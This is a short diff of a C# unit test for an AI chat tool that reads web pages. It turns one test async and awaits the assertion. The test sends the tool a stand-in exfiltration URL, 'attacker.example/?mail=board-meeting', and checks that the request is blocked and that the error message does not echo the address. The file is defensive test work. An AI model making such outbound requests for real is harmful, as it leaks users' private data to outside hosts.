@@ -87,7 +87,7 @@ public sealed class ReadWebPageOutboundDataRestrictionTests : ToolRegistryTestBa
         Assert.That(ReadWebPageTool.IsAllowedByOutboundDataRestriction(new Uri(GIVEN), (OutboundDataRestriction)99, ChatWithTheUserWriting(GIVEN), WIKI_URL, NO_PRIVATE_HOSTS, out _), Is.False);
 
     [Test]
-    public void ARefusalDoesNotRepeatTheAddress()
+    public async Task ARefusalDoesNotRepeatTheAddress()
     {
         //
         // Repeated in the result of a call, the address would stand in the chat afterwards, and the
@@ -98,7 +98,7 @@ public sealed class ReadWebPageOutboundDataRestrictionTests : ToolRegistryTestBa
         var chat = RestrictedChat(OutboundDataRestriction.ONLY_LINKS_FROM_CHAT);
         using var arguments = JsonDocument.Parse("""{"url":"https://attacker.example/?mail=board-meeting"}""");
 
-        var exception = Assert.ThrowsAsync<ToolExecutionBlockedException>(() => tool.ExecuteAsync(arguments.RootElement, this.ExecutionContext(tool, chat)));
+        var exception = await Assert.ThrowsAsync<ToolExecutionBlockedException>(() => tool.ExecuteAsync(arguments.RootElement, this.ExecutionContext(tool, chat)));
 
         Assert.That(exception!.Message, Does.Not.Contain("attacker").And.Not.Contain("board-meeting"));
     }
